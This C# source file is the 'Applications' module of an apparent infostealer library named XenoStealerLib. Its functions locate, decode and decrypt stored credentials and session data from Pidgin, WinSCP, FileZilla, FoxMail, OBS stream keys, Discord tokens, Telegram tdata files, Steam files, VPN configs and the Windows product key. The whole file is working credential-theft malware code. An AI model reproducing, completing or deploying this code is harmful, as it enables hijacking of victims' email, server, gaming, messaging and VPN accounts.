using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using XenoStealerLib.Utils;
using System.Xml;
using System.Web.Script.Serialization;

namespace XenoStealerLib
{
    public class Applications
    {
        private string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private string roamingAppdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string commonAppdata = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

        private bool Aggresive = false;

        public Applications(bool aggresive = false)
        {
            Aggresive = aggresive;
        }

        public string[] GetProtonVpnFiles() 
        {
            return Vpns.GetProtonVpnPaths();
        }

        public string[] GetOpenVpnsFiles() 
        {
            return Vpns.OpenVpnPaths();
        }

        public Vpns.NordVpnInfo[] GetNordVpnInfo() 
        {
            return Vpns.GetNordVpnInfo();
        }

        public string GetWindowsProductId()
        {
            byte[] EncryptedKey = WindowsProductKeyUtils.GetEncryptedProductId();
            if (EncryptedKey == null) 
            {
                return null;
            }
            return WindowsProductKeyUtils.DecodeProductKey(EncryptedKey);
        }

        public PidginInfo[] GetPidginInfo() 
        { 
            List<PidginInfo> pidginInfos = new List<PidginInfo>();
            string accountPath = Path.Combine(roamingAppdata, ".purple\\accounts.xml");
            if (!File.Exists(accountPath)) 
            {
                return pidginInfos.ToArray();
            }
            XmlDocument Parsed = new XmlDocument();
            Parsed.Load(accountPath);
            foreach (XmlNode accountData in Parsed.GetElementsByTagName("account")) 
            {
                string protocol = null;
                string name = null;
                string password = null;
                foreach (XmlNode Children in accountData.ChildNodes) 
                {
                    if (Children.Name == "protocol")
                    {
                        protocol=Children.InnerText;
                    }
                    else if (Children.Name == "name") 
                    { 
                        name=Children.InnerText;
                    }
                    else if (Children.Name == "password")
                    {
                        password=Children.InnerText;
                    }
                }
                if (string.IsNullOrEmpty("protocol") || string.IsNullOrEmpty("name") || password==null) 
                {
                    continue;
                }
                pidginInfos.Add(new PidginInfo(protocol, name, password));
            }
            return pidginInfos.ToArray();
        }

        public OBSInfo[] GetOBSInfo() 
        { 
            List<OBSInfo> OBSData = new List<OBSInfo>();
            string OBSProfilepath = Path.Combine(roamingAppdata, "obs-studio\\basic\\profiles");
            if (!Directory.Exists(OBSProfilepath)) 
            {
                return null;
            }
            foreach (string profile in Directory.GetDirectories(OBSProfilepath)) 
            {
                string ServiceFile = Path.Combine(profile, "service.json");
                string BackupServiceFile = Path.Combine(profile, "service.json.bak");
                if (File.Exists(ServiceFile)) 
                {
                    JavaScriptSerializer serializer = new JavaScriptSerializer();
                    dynamic jsonObject = serializer.Deserialize<dynamic>(File.ReadAllText(ServiceFile));
                    if (jsonObject!=null && jsonObject.ContainsKey("settings") && jsonObject["settings"].ContainsKey("service") && jsonObject["settings"].ContainsKey("key")) 
                    {
                        OBSData.Add(new OBSInfo((string)jsonObject["settings"]["service"], (string)jsonObject["settings"]["key"]));
                    }
                }
                if (File.Exists(BackupServiceFile))
                {
                    JavaScriptSerializer serializer = new JavaScriptSerializer();
                    dynamic jsonObject = serializer.Deserialize<dynamic>(File.ReadAllText(BackupServiceFile));
                    if (jsonObject != null && jsonObject.ContainsKey("settings") && jsonObject["settings"].ContainsKey("service") && jsonObject["settings"].ContainsKey("key"))
                    {
                        OBSData.Add(new OBSInfo((string)jsonObject["settings"]["service"], (string)jsonObject["settings"]["key"]));
                    }
                }
            }
            return OBSData.ToArray();
        }

        public string GetNgrokConfigPath() 
        {
            string path = Path.Combine(localAppdata, "ngrok\\ngrok.yml");
            if (File.Exists(path)) 
            {
                return path;
            }
            return null;
        }

        public SteamInfo GetSteamInfo() 
        {
            List<string> games = new List<string>();
            string SteamPath = null;
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        string path = "Software\\Valve\\Steam";
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(path))
                        {
                            string temp_steamPath=OpenedKey.GetValue("SteamPath").ToString();
                            if (temp_steamPath == null) 
                            {
                                continue;
                            }
                            SteamPath = temp_steamPath;
                            using (RegistryKey AppsKey = OpenedKey.OpenSubKey("Apps")) 
                            {
                                foreach (string AppID in AppsKey.GetSubKeyNames()) 
                                {
                                    using (RegistryKey AppData = AppsKey.OpenSubKey(AppID)) 
                                    {
                                        object gameName = AppData.GetValue("Name");
                                        if (gameName != null)
                                        {
                                            games.Add(gameName.ToString());
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch
                {
                }
                if (SteamPath!=null)
                {
                    break;
                }
            }
            if (SteamPath == null) 
            {
                return null;
            }
            return new SteamInfo(SteamPath, games.ToArray());
        }

        public WinscpInfo[] GetWinscpInfo() 
        {
            List<WinscpInfo> result = new List<WinscpInfo>();
            if (!WinscpUtils.Installed()) 
            {
                result.ToArray();
            }
            string masterPasswordVerifier = WinscpUtils.GetMasterPasswordVerifier();
            bool isMasterPasswordVerifier = masterPasswordVerifier != null;
            if (!isMasterPasswordVerifier) 
            {
                masterPasswordVerifier = "";
            }


            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        string path = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(path))
                        {
                            foreach (string key in OpenedKey.GetSubKeyNames())
                            {
                                try
                                {
                                    using (RegistryKey dataKey = OpenedKey.OpenSubKey(key))
                                    {
                                        string HostName = (string)dataKey.GetValue("HostName");
                                        if (HostName == null) 
                                        {
                                            HostName = "";
                                        }
                                        string UserName = (string)dataKey.GetValue("UserName");
                                        if (UserName == null) 
                                        {
                                            UserName = "";
                                        }
                                        string Password = (string)dataKey.GetValue("Password");
                                        if (Password == null) 
                                        {
                                            Password = "";
                                        }
                                        int PortNumber = 22;
                                        object Portdata = dataKey.GetValue("PortNumber");
                                        if (Portdata != null)
                                        {
                                            PortNumber = (int)Portdata;
                                        }
                                        if (!isMasterPasswordVerifier && !string.IsNullOrEmpty(Password))
                                        {
                                            Password = WinscpUtils.DecryptData(Password); 
                                            Password = Password.Substring(HostName.Length + UserName.Length);
                                        }
                                        if (string.IsNullOrEmpty(HostName) && string.IsNullOrEmpty(UserName) && string.IsNullOrEmpty(Password)) 
                                        {
                                            continue;
                                        }
                                        
                                        result.Add(new WinscpInfo(HostName, PortNumber, UserName,Password, isMasterPasswordVerifier, masterPasswordVerifier));
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                }
                catch
                {

                }
                if (result.Count > 0) 
                {
                    break;
                }
            }
            return result.ToArray();
        }

        public FileZillaInfo[] GetFileZillaInfo() 
        {
            List<FileZillaInfo> result= new List<FileZillaInfo>();
            string[] filenames = new string[] { "sitemanager.xml", "recentservers.xml", "filezilla.xml" };
            string[] possiblePaths = new string[] { localAppdata, roamingAppdata, commonAppdata };
            foreach (string Rootpath in possiblePaths) 
            {
                foreach (string filename in filenames) 
                {
                    string filePath = Path.Combine(Rootpath, "FileZilla" ,filename);
                    if (!File.Exists(filePath)) 
                    {
                        continue;
                    }
                    XmlDocument Parsed = new XmlDocument();
                    Parsed.Load(filePath);
                    foreach (XmlNode node in Parsed.GetElementsByTagName("Server")) 
                    {
                        if (node.HasChildNodes) 
                        {
                            string Host = "";
                            int Port = int.MaxValue;
                            string User = "";
                            string Password = "";
                            bool Encrypted = false;
                            foreach (XmlNode children in node.ChildNodes)
                            {
                                if (children.Name == "Host")
                                {
                                    Host = children.InnerText;
                                }
                                else if (children.Name == "Port")
                                {
                                    bool worked=int.TryParse(children.InnerText, out int portnum);
                                    if (worked) 
                                    {
                                        Port = portnum;
                                    }
                                }
                                else if (children.Name == "User")
                                {
                                    User = children.InnerText;
                                }
                                else if (children.Name == "Pass") 
                                {
                                    XmlNode encodingData= children.Attributes.Item(0);
                                    if (encodingData.Name != "encoding") 
                                    {
                                        continue;
                                    }
                                    Password = children.InnerText;
                                    if (encodingData.Value != "base64")
                                    {
                                        Encrypted = true;
                                    }
                                    else 
                                    {
                                        Password=Encoding.UTF8.GetString(Convert.FromBase64String(Password));
                                    }
                                }
                            }
                            if (Host != "" && Port != int.MaxValue && User != "" && Password != "") 
                            {
                                result.Add(new FileZillaInfo(Host, Port, User, Password, Encrypted));
                            }
                        }
                    }
                }
            }

            return result.ToArray();

        }

        public Outlook.OutlookInfo[] GetOutlookInfo() 
        {
            return Outlook.GrabOutlook().ToArray();
        }

        public FoxMailInfo[] GetFoxMailInfo() 
        {
            List<FoxMailInfo> unsortedResult = new List<FoxMailInfo>();
            string foxMailPath = FoxMailUtils.GetFoxMailLocation();
            if (foxMailPath == null) 
            {
                return unsortedResult.ToArray();
            }
            string foxMailStoragePath = Path.Combine(foxMailPath, "Storage");
            
            if (!Directory.Exists(foxMailStoragePath)) 
            {
                return unsortedResult.ToArray();
            }
            foreach (string emailDir in Directory.GetDirectories(foxMailStoragePath, "*@*")) 
            {
                try
                {
                    string AccountDatabasePath = Path.Combine(emailDir, "Accounts", "Account.rec0");
                    if (!File.Exists(AccountDatabasePath))
                    {
                        continue;
                    }
                    byte[] databaseBytes = File.ReadAllBytes(AccountDatabasePath);
                    Dictionary<string, List<string>> databaseStrings = FoxMailUtils.parseRecFileStrings(databaseBytes);
                    if (databaseStrings == null)
                    {
                        continue;
                    }
                    if (databaseStrings.ContainsKey("Account") && databaseStrings.ContainsKey("Password") && databaseStrings["Account"].Count == databaseStrings["Password"].Count)
                    {
                        List<string> accounts = databaseStrings["Account"];
                        List<string> passwords = databaseStrings["Password"];
                        for (int i = 0; i < accounts.Count; i++)
                        {
                            string DecodedPassword = FoxMailUtils.DecodePassword(passwords[i]);
                            if (DecodedPassword == null)
                            {
                                continue;
                            }
                            unsortedResult.Add(new FoxMailInfo(accounts[i], DecodedPassword, false, AccountDatabasePath));
                        }
                    }
                    if (databaseStrings.ContainsKey("POP3Account") && databaseStrings.ContainsKey("POP3Password") && databaseStrings["POP3Account"].Count == databaseStrings["POP3Password"].Count)
                    {
                        List<string> accounts = databaseStrings["POP3Account"];
                        List<string> passwords = databaseStrings["POP3Password"];
                        for (int i = 0; i < accounts.Count; i++)
                        {
                            string DecodedPassword = FoxMailUtils.DecodePassword(passwords[i]);
                            if (DecodedPassword == null)
                            {
                                continue;
                            }
                            unsortedResult.Add(new FoxMailInfo(accounts[i], DecodedPassword, true, AccountDatabasePath));
                        }
                    }
                }
                catch { }
            }

            List<FoxMailInfo> result = new List<FoxMailInfo>();
            foreach (FoxMailInfo i in unsortedResult) 
            {
                if (!FoxMailInfoSlowContains(result, i)) 
                {
                    result.Add(i);
                }
            }
            return result.ToArray();

        }

        private bool FoxMailInfoSlowContains(List<FoxMailInfo> iterable, FoxMailInfo obj)
        {
            foreach (FoxMailInfo i in iterable)
            {
                if (i.Equals(obj))
                {
                    return true;
                }
            }
            return false;
        }

        public Discord.DiscordTokenInfo[] GetDiscordTokens(bool CheckIfTokensAreAlive=true, bool ScanBrowsers=true) 
        {
            return Discord.GrabTokens(CheckIfTokensAreAlive, ScanBrowsers);
        }

        public FileInfo[] GetTelegramFiles()
        {
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            string path = Path.Combine(userProfile, @"AppData\Roaming\Telegram Desktop\tdata");

            if (!Directory.Exists(path))
                return null;

            string sessions = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] exclude = new string[] { "_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5",  "user_data#6", "*.json", "webview" };
            string[] excludePatterns = new string[] { "_.*\\.config", "dumps", "tdummy", "emoji", "user_data", "user_data#\\d+", ".*\\.json", "webview" };
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            FileInfo[] files = directoryInfo.GetFiles("*", SearchOption.AllDirectories).Where(f => !IsExcluded(f.FullName, excludePatterns)).ToArray();
            return files;
        }//gets files that need to be copied

        private bool IsExcluded(string filePath, string[] patterns)
        {
            foreach (string pattern in patterns)
            {
                if (Regex.IsMatch(filePath, pattern))
                {
                    return true;
                }
            }
            return false;
        }

        public class PidginInfo 
        {
            public string Protocol;
            public string Username;
            public string Password;
            public PidginInfo(string protocol, string username, string password)
            {
                Protocol = protocol;
                Username = username;
                Password = password;
            }
        }

        public class OBSInfo 
        {
            public string Service;
            public string StreamKey;
            public OBSInfo(string service, string streamKey)
            {
                Service = service;
                StreamKey = streamKey;
            }
        }

        public class SteamInfo 
        {
            public string steamPath;
            public string[] games;


            public SteamInfo(string steamPath, string[] games)
            {
                this.games = games;
                this.steamPath = steamPath;
            }

            public string[] GetSsnfFilePaths() 
            { 
                List<string> files= new List<string>();
                if (Directory.Exists(steamPath))
                {
                    foreach (string file in Directory.GetFiles(steamPath))
                    {
                        if (file.Contains("ssfn")) 
                        {
                            files.Append(file);
                        }
                    }
                }
                return files.ToArray();
            }
            public string[] GetVdfFilePaths() 
            {
                List<string> files = new List<string>();
                string configPath = Path.Combine(steamPath, "config");
                if (Directory.Exists(configPath))
                {
                    foreach (var file in Directory.GetFiles(configPath))
                    {
                        if (file.EndsWith("vdf")) 
                        {
                            files.Add(file);
                        }
                    }
                }
                return files.ToArray();
            }
        }

        public class WinscpInfo 
        {
            public string Hostname;
            public int Port;
            public string Username;
            public string Password;
            public bool isMasterPassword;
            public string MasterPasswordVerifier;
            public WinscpInfo(string hostname, int port, string username, string password, bool isMasterPassword, string masterPasswordVerifier)
            {
                Hostname = hostname;
                Port = port;
                Username = username;
                Password = password;
                this.isMasterPassword = isMasterPassword;
                MasterPasswordVerifier = masterPasswordVerifier;
            }
        }

        public class FileZillaInfo 
        {
            public string Host;
            public int Port;
            public string User;
            public string Password;
            public bool Encrypted;
            public FileZillaInfo(string host, int port, string user, string password, bool encrypted)
            {
                Host = host;
                Port = port;
                User = user;
                Password = password;
                Encrypted = encrypted;
            }
        }

        public class FoxMailInfo
        {
            public string Account;
            public string Password;
            public bool isPop3;
            public string RecordPath;

            public FoxMailInfo(string Account, string Password, bool isPop3, string RecordPath) 
            {
                this.Account = Account;
                this.Password = Password;
                this.isPop3 = isPop3;
                this.RecordPath = RecordPath;
            }

            public bool Equals(FoxMailInfo second)
            {
                return Account == second.Account && Password == second.Password && isPop3 == second.isPop3;
            }

        }
    }
}
